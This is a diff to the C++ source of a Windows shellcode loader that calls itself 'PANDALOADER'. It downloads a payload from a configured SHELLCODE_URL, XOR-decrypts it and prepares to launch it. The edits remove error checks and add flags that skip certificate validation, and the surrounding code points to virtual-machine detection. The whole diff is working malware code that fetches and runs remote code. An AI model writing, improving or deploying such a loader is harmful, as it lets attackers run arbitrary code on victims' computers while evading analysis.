@@ -199,30 +199,16 @@ BOOL VMPROTECT() {
     return FALSE;
 }
 
-
-BOOL GetPayloadFromUrl(LPCWSTR szUrl, std::vector<BYTE>& payload) {
+void GetPayloadFromUrl(LPCWSTR szUrl, std::vector<BYTE>& payload) {
     HINTERNET hInternet = InternetOpenW(OBF(L"PANDALOADER"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    if (!hInternet) {
-        return FALSE;
-    }
-    HINTERNET hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
-    if (!hInternetFile) {
-        InternetCloseHandle(hInternet);
-        return FALSE;
-    }
-    DWORD bytesRead;
+    HINTERNET hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS, 0);
     BYTE buffer[4096];
-    while (InternetReadFile(hInternetFile, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0) {
+    DWORD bytesRead;
+    while (InternetReadFile(hInternetFile, buffer, sizeof(buffer), &bytesRead) && bytesRead) {
         payload.insert(payload.end(), buffer, buffer + bytesRead);
-    }
-    if (bytesRead == 0 && GetLastError() != ERROR_SUCCESS) {
-        InternetCloseHandle(hInternetFile);
-        InternetCloseHandle(hInternet);
-        return FALSE;
     }
     InternetCloseHandle(hInternetFile);
     InternetCloseHandle(hInternet);
-    return TRUE;
 }
 
 BOOL IsRunningAsAdmin() {
@@ -360,9 +346,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     }
     std::vector<BYTE> payload;
     LPCWSTR url = SHELLCODE_URL;
-    if (!GetPayloadFromUrl(url, payload)) {
-        return 1;
-    }
+    GetPayloadFromUrl(url, payload);
     std::string key = XOR_DECRYPTION_KEY;
     XORDecrypt(payload, key);
     STARTUPINFOA si = { 0 };
